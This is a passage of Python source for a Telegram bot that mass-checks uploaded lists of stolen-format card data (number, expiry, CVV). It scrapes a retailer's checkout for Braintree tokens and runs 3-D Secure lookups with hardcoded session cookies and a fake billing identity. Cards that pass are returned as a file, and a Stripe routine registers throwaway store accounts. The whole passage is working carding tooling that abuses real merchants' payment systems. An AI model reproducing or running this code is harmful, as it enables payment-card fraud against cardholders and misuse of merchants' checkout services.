            f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➙ {country_line}\n\n"
            f"𝗧𝗼𝗼𝗸 : <code>{elapsed}</code> (seconds) PREMIUM")

def create_vbv_buttons(card_number, status, passed, failed, total, show_stop=True):
    markup = types.InlineKeyboardMarkup(row_width=1)
    
    btn_card = types.InlineKeyboardButton(
        f"💳 {card_number}", 
        callback_data="vbv_card"
    )
    markup.add(btn_card)
    
    btn_status = types.InlineKeyboardButton(
        f"📨 {status}", 
        callback_data="vbv_status"
    )
    markup.add(btn_status)
    
    btn_passed = types.InlineKeyboardButton(
        f"✅ Passed: {passed}", 
        callback_data="vbv_passed"
    )
    btn_failed = types.InlineKeyboardButton(
        f"❌ Failed: {failed}", 
        callback_data="vbv_failed"
    )
    markup.add(btn_passed, btn_failed)
    
    btn_total = types.InlineKeyboardButton(
        f"📊 Total: {total}", 
        callback_data="vbv_total"
    )
    markup.add(btn_total)
    
    if show_stop:
        btn_stop = types.InlineKeyboardButton(
            "⏹️ Stop Scan", 
            callback_data="vbv_stop"
        )
        markup.add(btn_stop)
    
    return markup

def scan_vbv_file_background(message, file_path, original_filename, user_id):
    vbv_scanning_sessions[user_id] = {
        'active': True,
        'stop': False,
        'passed': 0,
        'failed': 0,
        'total': 0,
        'elapsed': 0,
        'current_card': "Waiting...",
        'current_status': "⏳ Starting...",
        'passed_cards': []
    }
    
    try:
        cards = []
        with open(file_path, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                parts = line.split('|')
                if len(parts) != 4:
                    continue
                num, mon, year, cvc = parts
                num = num.replace(' ', '')
                mon = mon.zfill(2)
                if len(year) == 4 and year.startswith('20'):
                    year2 = year[2:]
                else:
                    year2 = year[-2:]
                cards.append((num, mon, year2, cvc))
        
        os.remove(file_path)
        
        if not cards:
            bot.send_message(message.chat.id, "❌ File is empty or invalid format.")
            vbv_scanning_sessions[user_id]['active'] = False
            return
        
        total = len(cards)
        passed = 0
        failed = 0
        errors = 0
        start_time = time.time()
        current_card = "Waiting..."
        current_status = "⏳ Starting..."
        passed_cards = []
        
        vbv_scanning_sessions[user_id]['total'] = total
        vbv_scanning_sessions[user_id]['passed_cards'] = passed_cards
        
        markup = create_vbv_buttons(
            current_card,
            current_status,
            passed,
            failed,
            total
        )
        
        status_msg = bot.send_message(
            message.chat.id,
            f"📁 File: {original_filename}\n"
            f"⚡ Gateway: VBV (Braintree)\n"
            f"⏳ Time: 0s\n"
            f"🕐 {datetime.now().strftime('%I:%M %p')}",
            reply_markup=markup,
            parse_mode="HTML"
        )
        
        vbv_scanning_sessions[user_id]['message_id'] = status_msg.message_id
        
        for idx, (num, mon, year2, cvc) in enumerate(cards, 1):
            if vbv_scanning_sessions[user_id].get('stop', False):
                bot.send_message(
                    message.chat.id,
                    f"⏹ Scan stopped at {idx-1}/{total} cards."
                )
                break
            
            card_display = f"{num}|{mon}|20{year2}|{cvc}"
            current_card = card_display
            vbv_scanning_sessions[user_id]['current_card'] = current_card
            
            try:
                result_status, result_data = check_vbv(num, mon, year2, cvc)
                
                if result_status == "passed":
                    passed += 1
                    current_status = "Passed ✅"
                    passed_cards.append(card_display)
                    vbv_scanning_sessions[user_id]['passed_cards'] = passed_cards
                    result_msg = format_vbv_result(result_status, result_data, num, mon, f"20{year2}", cvc, round(time.time() - start_time, 2))
                    bot.send_message(message.chat.id, result_msg, parse_mode="HTML")
                elif result_status == "failed":
                    failed += 1
                    current_status = "Failed ❌"
                else:
                    errors += 1
                    current_status = "⚠️ Error"
                
                vbv_scanning_sessions[user_id]['passed'] = passed
                vbv_scanning_sessions[user_id]['failed'] = failed
                vbv_scanning_sessions[user_id]['current_status'] = current_status
                
            except Exception as e:
                errors += 1
                current_status = f"❌ {str(e)[:20]}"
            
            elapsed = round(time.time() - start_time, 2)
            vbv_scanning_sessions[user_id]['elapsed'] = elapsed
            
            new_markup = create_vbv_buttons(
                current_card,
                current_status,
                passed,
                failed,
                total
            )
            
            try:
                bot.edit_message_text(
                    f"📁 File: {original_filename}\n"
                    f"⚡ Gateway: VBV (Braintree)\n"
                    f"⏳ Time: {elapsed}s\n"
                    f"🕐 {datetime.now().strftime('%I:%M %p')}",
                    chat_id=message.chat.id,
                    message_id=status_msg.message_id,
                    reply_markup=new_markup,
                    parse_mode="HTML"
                )
            except:
                pass
            
            time.sleep(random.uniform(1, 2))
        
        elapsed = round(time.time() - start_time, 2)
        vbv_scanning_sessions[user_id]['elapsed'] = elapsed
        
        if passed_cards:
            approved_content = '\n'.join(passed_cards)
            output_file = io.BytesIO()
            output_file.write(approved_content.encode('utf-8'))
            output_file.seek(0)
            
            bot.send_document(
                message.chat.id,
                output_file,
                visible_file_name=f'vbv_passed_{original_filename}',
                caption=f"✅ VBV Passed Cards: {len(passed_cards)}"
            )
        else:
            bot.send_message(
                message.chat.id,
                "❌ No VBV passed cards found."
            )
        
        final_markup = create_vbv_buttons(
            "✅ Completed",
            "Done",
            passed,
            failed,
            total,
            show_stop=False
        )
        
        if not vbv_scanning_sessions[user_id].get('stop', False):
            final_msg = (
                f"✅ VBV Scan Completed!\n\n"
                f"📁 File: {original_filename}\n"
                f"⚡ Gateway: VBV (Braintree)\n"
                f"⏱️ Time: {elapsed}s\n\n"
                f"✅ Passed: {passed}\n"
                f"❌ Failed: {failed}\n"
                f"⚠️ Errors: {errors}\n"
                f"📊 Total: {total}"
            )
        else:
            final_msg = (
                f"⏹ VBV Scan Stopped!\n\n"
                f"📁 File: {original_filename}\n"
                f"⚡ Gateway: VBV (Braintree)\n"
                f"⏱️ Time: {elapsed}s\n\n"
                f"✅ Passed: {passed}\n"
                f"❌ Failed: {failed}\n"
                f"⚠️ Errors: {errors}\n"
                f"📊 Total: {total}"
            )
        
        try:
            bot.edit_message_text(
                final_msg,
                chat_id=message.chat.id,
                message_id=status_msg.message_id,
                reply_markup=final_markup,
                parse_mode="HTML"
            )
        except:
            bot.send_message(message.chat.id, final_msg, reply_markup=final_markup, parse_mode="HTML")
        
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {str(e)}")
    finally:
        vbv_scanning_sessions[user_id]['active'] = False

# ======================================================
# ===== دوال VBV V2 (Warren James - Braintree) =====
# ======================================================

def get_bin_info_vbv2(bin_number):
    try:
        url = f"https://bins.antipublic.cc/bins/{bin_number}"
        resp = httpx.get(url, timeout=10)
        if resp.status_code == 200:
            data = resp.json()
            return {
                "brand": data.get("brand", "Unknown"),
                "type": data.get("type", "Unknown"),
                "level": data.get("level", "Unknown"),
                "bank": data.get("bank", "Unknown"),
                "country": data.get("country_name", "Unknown"),
                "flag": data.get("country_flag", "🏳️"),
                "country_code": data.get("country_code", "N/A"),
                "bin": bin_number
            }
    except:
        pass
    return None

def check_vbv2(card_number, exp_month, exp_year, cvc):
    try:
        n = card_number
        mm = exp_month.zfill(2) if len(exp_month) < 2 else exp_month
        yy = exp_year
        if len(str(yy)) == 4 and "20" in str(yy):
            yy = str(yy).split("20")[1]
        elif len(str(yy)) == 4:
            yy = str(yy)[2:]
        cvc = str(cvc)
        bin_num = n[:6]

        cookies = {
            'CFID': '73049272',
            'CFTOKEN': 'd1b3a93cdb076371-986A8B6D-FB2A-E7E8-3E72D4CBFF12485E',
            'wj_lttid': '986A8BE4-AF1B-1B29-10BE785CCA54FEA5',
            'wj_anon_id': '986A8BE4-AF1B-1B29-10BE785CCA54FEA5',
            'wj_ft_first_seen': '1785673647',
            'wj_ft_landing_page': '%2F',
            'wj_ft_landing_canon': '%2F',
            'CookieConsent': '{stamp:%27-1%27%2Cnecessary:true%2Cpreferences:true%2Cstatistics:true%2Cmarketing:true%2Cmethod:%27implied%27%2Cver:1%2Cutc:1785673649393%2Cregion:%27EG%27}',
            'gdpr.consent.version': '1%2E0%2E6',
            'gdpr.consent.status': 'true',
            'gdpr.consent.necessary': 'true',
            'gdpr.consent.analytics': 'true',
            'gdpr.consent.marketing': 'true',
            'wj_cm2': 'grant-all',
            '_ga': 'GA1.1.1818682083.1785673651',
            'ga_client_id': '1818682083.1785673651',
            '_fbp': 'fb.2.1785673651736.514945051296523239.AQYCAQMB',
            '_tt_enable_cookie': '1',
            '_ttp': '01KZ1736WQW38W6ETRKGSHE7PS_.tt.2',
            '_cls_v': '05691107-d0c8-4e60-9ec8-c90888afed10',
            '__kla_id': 'eyJjaWQiOiJZemRtWm1RM1ltTXROemRtWWkwMFpXTm1MVGswWWpndE1XSmhOMkl3TTJaaE5qSmwiLCIkZXhjaGFuZ2VfaWQiOiIxdVBjenpuVk9GSTNZUTNFUlRYRDlrSmRXNkgyOXY3MDBydnk3TjhTakY0LlVjV25zcCJ9',
            'LB-persist': 'warrenJamesWeb1',
            'JSESSIONID': 'FDE57794B3C5D4C90F7A0FB3E27C5E5F.cfusion',
            'wj.shoppingbasket.id': '75F044E8AF794FE208E22F2BE8CBBF44',
            'wj.shoppingbasket.key': 'AB2FA139A0E4C1C54DA61CB78319BB00DC7FC173339BC632665B10DFBF285006968A8C0A1325E4F90624A6DAE9E80863BE6A53175FFA36799C9672BE0E4E276C4A92F109CD1511D8C2246EE8168BEAAE',
            '_cls_s': 'b9cce057-ea53-4c3e-849d-80802dd6ecaf:1',
            'ga_session_id': '1786649530',
            'ga_session_number': '6',
            'WJ_CUSTOMER_ID': 'F8C7B5692AB22D93EEB45247642BD3EC',
            'KLAVIYO.EVENT_ID': '1786653366%5F9445899311',
            '_gcl_au': '1.1.556167861.1785673649.1606642086.1786649690.1786649792.216189212.1786649690.1786649792',
            '_ga_JH7DV8N73Q': 'GS2.1.s1786649530$o6$g1$t1786649936$j52$l0$h0',
            '_uetsid': 'aee56860974d11f1a85a855006fa8323|1unkezf|2|g8k|0|2416',
            '_uetvid': '901146208e6d11f193ce1d5eb1a65481|1qhqxr7|1786649940014|5|1|bat.bing.com/p/insights/c/v',
            'ttcsid': '1786649539237::Jovri-owazjYzlrPOblH.8.1786649943997.0::1.393502.398517::404730.19.291.58::251408.33.820',
            'ttcsid_CVV79P3C77U0VMU9E2P0': '1786649539224::nEzsSCrjq8CC7ovM12RM.8.1786649943998.1',
        }

        headers = {
            'authority': 'www.warrenjames.co.uk',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'referer': 'https://www.warrenjames.co.uk/jewellery/womens',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        }

        response = httpx.get(
            'https://www.warrenjames.co.uk/shopping-bag/',
            cookies=cookies,
            headers=headers,
            timeout=25,
            verify=False
        )

        if response.status_code != 200:
            return "error", {"error": f"Page fetch failed: HTTP {response.status_code}"}

        match = re.search(r"authorization:\s*'([^']+)'", response.text)
        if not match:
            return "error", {"error": "Authorization token not found"}
        raw_token = match.group(1)
        try:
            decoded_json = json.loads(base64.b64decode(raw_token).decode('utf-8'))
            au = decoded_json.get('authorizationFingerprint')
            if not au:
                au = raw_token
        except:
            au = raw_token

        df_reference_id = None
        df_match = re.search(r'dfReferenceId\s*[:=]\s*["\']([^"\']+)["\']', response.text)
        if df_match:
            df_reference_id = df_match.group(1)
        else:
            device_match = re.search(r'deviceData\s*[:=]\s*["\']([^"\']+)["\']', response.text)
            if device_match:
                try:
                    device_data = json.loads(device_match.group(1))
                    df_reference_id = device_data.get('dfReferenceId')
                except:
                    pass

        if not df_reference_id:
            df_reference_id = '1_b85b0344-bbc3-48bd-851d-626f70c81c08'

        session_id_match = re.search(r'sessionId["\']?\s*[:=]\s*["\']([^"\']+)["\']', response.text)
        session_id = session_id_match.group(1) if session_id_match else '2769e740-e5cf-4acb-9e3a-8ff9f5eca337'

        api_headers = {
            'authority': 'payments.braintree-api.com',
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'authorization': f'Bearer {au}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'referer': 'https://assets.braintreegateway.com/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        }

        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'dropin2',
                'sessionId': session_id,
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId         business         consumer         purchase         corporate       }     }   } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': n,
                        'expirationMonth': mm,
                        'expirationYear': yy,
                        'cvv': cvc,
                        'billingAddress': {
                            'postalCode': 'WC2B 4DD',
                        },
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }

        api_response = httpx.post(
            'https://payments.braintree-api.com/graphql',
            headers=api_headers,
            json=json_data,
            timeout=25,
            verify=False
        )

        if api_response.status_code not in (200, 201):
            return "error", {"error": f"Tokenization HTTP {api_response.status_code}"}

        result_json = api_response.json()
        if 'errors' in result_json:
            return "error", {"error": f"Tokenization error: {result_json['errors']}"}
        
        tok = result_json['data']['tokenizeCreditCard']['token']
        
        cc_data = result_json['data']['tokenizeCreditCard'].get('creditCard', {})
        bin_info = {
            "brand": cc_data.get('brandCode', 'UNKNOWN').upper(),
            "type": "DEBIT" if cc_data.get('binData', {}).get('debit') == "Yes" else "CREDIT",
            "level": cc_data.get('binData', {}).get('productId', 'UNKNOWN'),
            "bank": cc_data.get('binData', {}).get('issuingBank', 'UNKNOWN') or 'UNKNOWN',
            "country": cc_data.get('binData', {}).get('countryOfIssuance', 'UNKNOWN') or 'UNKNOWN',
        }
        
        bin_full_info = get_bin_info_vbv2(bin_num)
        if bin_full_info:
            bin_info.update(bin_full_info)

        headers_3ds = {
            'authority': 'api.braintreegateway.com',
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/json',
            'origin': 'https://www.warrenjames.co.uk',
            'referer': 'https://www.warrenjames.co.uk/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        }

        json_data_3ds = {
            'amount': '42.95',
            'additionalInfo': {
                'workPhoneNumber': '',
                'shippingGivenName': 'Joanna',
                'shippingSurname': 'Mahmood',
                'shippingPhone': '',
                'acsWindowSize': '03',
                'billingLine1': '38 William Iv Street',
                'billingLine2': '',
                'billingCity': 'City Of Westminster',
                'billingState': '',
                'billingPostalCode': 'WC2B 4DD',
                'billingCountryCode': 'GB',
                'billingPhoneNumber': '441914960316',
                'billingGivenName': 'Joanna',
                'billingSurname': 'Mahmood',
                'shippingLine1': '38 William Iv Street',
                'shippingLine2': '',
                'shippingCity': 'City Of Westminster',
                'shippingState': '',
                'shippingPostalCode': 'WC2B 4DD',
                'shippingCountryCode': 'GB',
                'email': 'evansclaire@gmail.com',
            },
            'bin': bin_num,
            'dfReferenceId': df_reference_id,
            'clientMetadata': {
                'requestedThreeDSecureVersion': '2',
                'sdkVersion': 'web/3.123.2',
                'cardinalDeviceDataCollectionTimeElapsed': 1279,
                'issuerDeviceDataCollectionTimeElapsed': 11863,
                'issuerDeviceDataCollectionResult': False,
            },
            'authorizationFingerprint': au,
            'braintreeLibraryVersion': 'braintree/web/3.123.2',
            '_meta': {
                'merchantAppId': 'www.warrenjames.co.uk',
                'platform': 'web',
                'sdkVersion': '3.123.2',
                'source': 'client',
                'integration': 'custom',
                'integrationType': 'custom',
                'sessionId': session_id,
            },
        }

        response_3ds = httpx.post(
            f'https://api.braintreegateway.com/merchants/2tkqstd39228mnkt/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
            headers=headers_3ds,
            json=json_data_3ds,
            timeout=25,
            verify=False
        )

        vbv_text = response_3ds.text
        
        try:
            error_json = json.loads(vbv_text)
            if 'error' in error_json and 'message' in error_json['error']:
                return "error", {"error": f"3DS Error: {error_json['error']['message']}", "bin_info": bin_info}
        except:
            pass

        result_out = {
            "status": "unknown",
            "nonce": "",
            "token": tok,
            "sessionId": session_id,
            "dfReferenceId": df_reference_id,
            "bin_info": bin_info,
            "raw_response": vbv_text[:300]
        }

        if 'authenticate_successful' in vbv_text:
            return "passed", result_out
        elif 'authenticate_attempt_successful' in vbv_text:
            return "passed", result_out
        elif 'authenticate_frictionless_failed' in vbv_text:
            return "passed", result_out
        elif 'challenge_required' in vbv_text:
            return "failed", result_out
        elif 'authenticate_rejected' in vbv_text:
            return "failed", result_out
        elif 'lookup_card_error' in vbv_text:
            return "error", {"error": "lookup_card_error ⚠️", "bin_info": bin_info}
        elif 'lookup_error' in vbv_text:
            return "error", {"error": f"lookup_error (BIN={bin_num})", "bin_info": bin_info}
        else:
            return "error", {"error": vbv_text[:200], "bin_info": bin_info}

    except Exception as e:
        return "error", {"error": str(e)[:200]}

def format_vbv2_result(status, result, card_num, mon, year, cvc, elapsed):
    bin_info = result.get('bin_info', {})
    
    if status == "passed":
        title = "✅ VBV V2 PASSED"
        response = "3DS Authenticate Successful"
    elif status == "failed":
        title = "❌ VBV V2 FAILED"
        response = "3DS Challenge Required / Rejected"
    else:
        title = "⚠️ VBV V2 ERROR"
        response = f"<code>{result.get('error', 'Unknown error')}</code>"
    
    brand = bin_info.get('brand', 'N/A')
    card_type = bin_info.get('type', 'N/A')
    level = bin_info.get('level', 'N/A')
    bank = bin_info.get('bank', 'N/A')
    country = bin_info.get('country', 'N/A')
    flag = bin_info.get('flag', '🏳️')
    bin_number = bin_info.get('bin', card_num[:6])
    
    bin_line = f"{bin_number} - {card_type} - {brand} - {level}"
    bank_line = bank
    country_line = f"{country} {flag}"
    
    return (f"{title}\n\n"
            f"𝐂𝐚𝐫𝐝 ➙ <code>{card_num}|{mon}|{year}|{cvc}</code>\n"
            f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➙ Braintree V2 (Warren James)\n"
            f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➙ {response}\n\n"
            f"𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ➙ : {bin_line}\n"
            f"𝐁𝐚𝐧𝐤 ➙ {bank_line}\n"
            f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➙ {country_line}\n\n"
            f"𝗧𝗼𝗼𝗸 : <code>{elapsed}</code> (seconds) PREMIUM")

def create_vbv2_buttons(card_number, status, passed, failed, total, show_stop=True):
    markup = types.InlineKeyboardMarkup(row_width=1)
    
    btn_card = types.InlineKeyboardButton(
        f"💳 {card_number}", 
        callback_data="vbv2_card"
    )
    markup.add(btn_card)
    
    btn_status = types.InlineKeyboardButton(
        f"📨 {status}", 
        callback_data="vbv2_status"
    )
    markup.add(btn_status)
    
    btn_passed = types.InlineKeyboardButton(
        f"✅ Passed: {passed}", 
        callback_data="vbv2_passed"
    )
    btn_failed = types.InlineKeyboardButton(
        f"❌ Failed: {failed}", 
        callback_data="vbv2_failed"
    )
    markup.add(btn_passed, btn_failed)
    
    btn_total = types.InlineKeyboardButton(
        f"📊 Total: {total}", 
        callback_data="vbv2_total"
    )
    markup.add(btn_total)
    
    if show_stop:
        btn_stop = types.InlineKeyboardButton(
            "⏹️ Stop Scan", 
            callback_data="vbv2_stop"
        )
        markup.add(btn_stop)
    
    return markup

def scan_vbv2_file_background(message, file_path, original_filename, user_id):
    vbv2_sessions[user_id] = {
        'active': True,
        'stop': False,
        'passed': 0,
        'failed': 0,
        'total': 0,
        'elapsed': 0,
        'current_card': "Waiting...",
        'current_status': "⏳ Starting...",
        'passed_cards': []
    }
    
    try:
        cards = []
        with open(file_path, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                parts = line.split('|')
                if len(parts) != 4:
                    continue
                num, mon, year, cvc = parts
                num = num.replace(' ', '')
                mon = mon.zfill(2)
                if len(year) == 4 and year.startswith('20'):
                    year2 = year[2:]
                else:
                    year2 = year[-2:]
                cards.append((num, mon, year2, cvc))
        
        os.remove(file_path)
        
        if not cards:
            bot.send_message(message.chat.id, "❌ File is empty or invalid format.")
            vbv2_sessions[user_id]['active'] = False
            return
        
        total = len(cards)
        passed = 0
        failed = 0
        errors = 0
        start_time = time.time()
        current_card = "Waiting..."
        current_status = "⏳ Starting..."
        passed_cards = []
        
        vbv2_sessions[user_id]['total'] = total
        vbv2_sessions[user_id]['passed_cards'] = passed_cards
        
        markup = create_vbv2_buttons(
            current_card,
            current_status,
            passed,
            failed,
            total
        )
        
        status_msg = bot.send_message(
            message.chat.id,
            f"📁 File: {original_filename}\n"
            f"⚡ Gateway: VBV V2 (Warren James)\n"
            f"⏳ Time: 0s\n"
            f"🕐 {datetime.now().strftime('%I:%M %p')}",
            reply_markup=markup,
            parse_mode="HTML"
        )
        
        vbv2_sessions[user_id]['message_id'] = status_msg.message_id
        
        for idx, (num, mon, year2, cvc) in enumerate(cards, 1):
            if vbv2_sessions[user_id].get('stop', False):
                bot.send_message(
                    message.chat.id,
                    f"⏹ Scan stopped at {idx-1}/{total} cards."
                )
                break
            
            card_display = f"{num}|{mon}|20{year2}|{cvc}"
            current_card = card_display
            vbv2_sessions[user_id]['current_card'] = current_card
            
            try:
                result_status, result_data = check_vbv2(num, mon, year2, cvc)
                
                if result_status == "passed":
                    passed += 1
                    current_status = "Passed ✅"
                    passed_cards.append(card_display)
                    vbv2_sessions[user_id]['passed_cards'] = passed_cards
                    result_msg = format_vbv2_result(result_status, result_data, num, mon, f"20{year2}", cvc, round(time.time() - start_time, 2))
                    bot.send_message(message.chat.id, result_msg, parse_mode="HTML")
                elif result_status == "failed":
                    failed += 1
                    current_status = "Failed ❌"
                else:
                    errors += 1
                    current_status = "⚠️ Error"
                
                vbv2_sessions[user_id]['passed'] = passed
                vbv2_sessions[user_id]['failed'] = failed
                vbv2_sessions[user_id]['current_status'] = current_status
                
            except Exception as e:
                errors += 1
                current_status = f"❌ {str(e)[:20]}"
            
            elapsed = round(time.time() - start_time, 2)
            vbv2_sessions[user_id]['elapsed'] = elapsed
            
            new_markup = create_vbv2_buttons(
                current_card,
                current_status,
                passed,
                failed,
                total
            )
            
            try:
                bot.edit_message_text(
                    f"📁 File: {original_filename}\n"
                    f"⚡ Gateway: VBV V2 (Warren James)\n"
                    f"⏳ Time: {elapsed}s\n"
                    f"🕐 {datetime.now().strftime('%I:%M %p')}",
                    chat_id=message.chat.id,
                    message_id=status_msg.message_id,
                    reply_markup=new_markup,
                    parse_mode="HTML"
                )
            except:
                pass
            
            time.sleep(random.uniform(1, 2))
        
        elapsed = round(time.time() - start_time, 2)
        vbv2_sessions[user_id]['elapsed'] = elapsed
        
        if passed_cards:
            approved_content = '\n'.join(passed_cards)
            output_file = io.BytesIO()
            output_file.write(approved_content.encode('utf-8'))
            output_file.seek(0)
            
            bot.send_document(
                message.chat.id,
                output_file,
                visible_file_name=f'vbv2_passed_{original_filename}',
                caption=f"✅ VBV V2 Passed Cards: {len(passed_cards)}"
            )
        else:
            bot.send_message(
                message.chat.id,
                "❌ No VBV V2 passed cards found."
            )
        
        final_markup = create_vbv2_buttons(
            "✅ Completed",
            "Done",
            passed,
            failed,
            total,
            show_stop=False
        )
        
        if not vbv2_sessions[user_id].get('stop', False):
            final_msg = (
                f"✅ VBV V2 Scan Completed!\n\n"
                f"📁 File: {original_filename}\n"
                f"⚡ Gateway: VBV V2 (Warren James)\n"
                f"⏱️ Time: {elapsed}s\n\n"
                f"✅ Passed: {passed}\n"
                f"❌ Failed: {failed}\n"
                f"⚠️ Errors: {errors}\n"
                f"📊 Total: {total}"
            )
        else:
            final_msg = (
                f"⏹ VBV V2 Scan Stopped!\n\n"
                f"📁 File: {original_filename}\n"
                f"⚡ Gateway: VBV V2 (Warren James)\n"
                f"⏱️ Time: {elapsed}s\n\n"
                f"✅ Passed: {passed}\n"
                f"❌ Failed: {failed}\n"
                f"⚠️ Errors: {errors}\n"
                f"📊 Total: {total}"
            )
        
        try:
            bot.edit_message_text(
                final_msg,
                chat_id=message.chat.id,
                message_id=status_msg.message_id,
                reply_markup=final_markup,
                parse_mode="HTML"
            )
        except:
            bot.send_message(message.chat.id, final_msg, reply_markup=final_markup, parse_mode="HTML")
        
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error: {str(e)}")
    finally:
        vbv2_sessions[user_id]['active'] = False

# ======================================================
# ===== دوال Stripe Charge (ppool) =====
# ======================================================

def scan_single_card_sc(num, mon, year2, cvc):
    start_time = time.time()
    
    try:
        s = requests.Session()
        s.headers.update({
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
        })
        
        email = f"{fake.first_name()}{fake.last_name()}{random.randint(10,99)}@gmail.com"
        
        register_nonce = get_nonce(
            f"{BASE}/my-account/add-payment-method/",
            r'name="_wpnonce"[^>]*value="([^"]+)"',
            s,
            headers={'referer': f'{BASE}/my-account/add-payment-method/'}
        )
        if not register_nonce:
            return format_sc_result("Registration failed", num, mon, f"20{year2}", cvc, round(time.time() - start_time, 2), None, "declined")
        
        params = {'action': 'register'}
        data = {
            'email': email, 'email_2': '', 'wc_order_attribution_source_type': 'typein',
            'wc_order_attribution_referrer': '(none)', 'wc_order_attribution_utm_campaign': '(none)',
            'wc_order_attribution_utm_source': '(direct)', 'wc_order_attribution_utm_medium': '(none)',
            'wc_order_attribution_utm_content': '(none)', 'wc_order_attribution_utm_id': '(none)',
            'wc_order_attribution_utm_term': '(none)', 'wc_order_attribution_utm_source_platform': '(none)',
            'wc_order_attribution_utm_creative_format': '(none)', 'wc_order_attribution_utm_marketing_tactic': '(none)',
            'wc_order_attribution_session_entry': f'{BASE}/my-account/add-payment-method',
            'wc_order_attribution_session_pages': '2', 'wc_order_attribution_session_count': '1',
            'wc_order_attribution_user_agent': s.headers.get('User-Agent'),
            '_wpnonce': register_nonce, '_wp_http_referer': '/my-account/add-payment-method', 'register': 'Register',
        }
        r = s.post(f"{BASE}/my-account/", params=params, data=data, headers={'referer': f'{BASE}/my-account/add-payment-method/'})
        if r.status_code not in (200, 302):
            return format_sc_result("Registration failed", num, mon, f"20{year2}", cvc, round(time.time() - start_time, 2), None, "declined")
        
        url = f"{BASE}/my-account/edit-address/billing/"
        r = s.get(url, headers={'referer': f'{BASE}/my-account/edit-address/'})
        if r.status_code != 200:
            return format_sc_result("Address failed", num, mon, f"20{year2}", cvc, round(time.time() - start_time, 2), None, "declined")
        
        m = re.search(r'name="woocommerce-edit-address-nonce"[^>]*value="([^"]+)"', r.text)
        address_nonce = m.group(1) if m else None
        if not address_nonce:
            return format_sc_result("Address nonce failed", num, mon, f"20{year2}", cvc, round(time.time() - start_time, 2), None, "declined")
        
        data2 = {
            'billing_first_name': 'mama', 'billing_last_name': 'Baba', 'billing_company': '',
            'billing_country': 'AU', 'billing_address_1': '46 Trelawney Street', 'billing_address_2': '',
            'billing_city': 'Banksmeadow', 'billing_state': 'NSW', 'billing_postcode': '2019',
            'billing_phone': '(02) 9598 6159', 'billing_email': email, 'save_address': 'Save address',
            'woocommerce-edit-address-nonce': address_nonce, '_wp_http_referer': '/my-account/edit-address/billing',
            'action': 'edit_address',
        }
        r2 = s.post(url, headers={'origin': BASE, 'referer': url}, data=data2)
        if r2.status_code not in (200, 302):
            return format_sc_result("Address post failed", num, mon, f"20{year2}", cvc, round(time.time() - start_time, 2), None, "declined")
        
        url2 = f"{BASE}/my-account/add-payment-method/"
        r3 = s.get(url2, headers={'referer': f'{BASE}/my-account/payment-methods/'})
        if r3.status_code != 200:
            return format_sc_result("Payment page failed", num, mon, f"20{year2}", cvc, round(time.time() - start_time, 2), None, "declined")
        
        create_nonce_m = re.search(r'"createAndConfirmSetupIntentNonce":"([^"]+)"', r3.text)
        create_nonce = create_nonce_m.group(1) if create_nonce_m else None
        if not create_nonce:
            return format_sc_result("Nonce not found", num, mon, f"20{year2}", cvc, round(time.time() - start_time, 2), None, "declined")
        
        headers = {
            'authority': 'api.stripe.com', 'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com', 'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform': '"Android"',
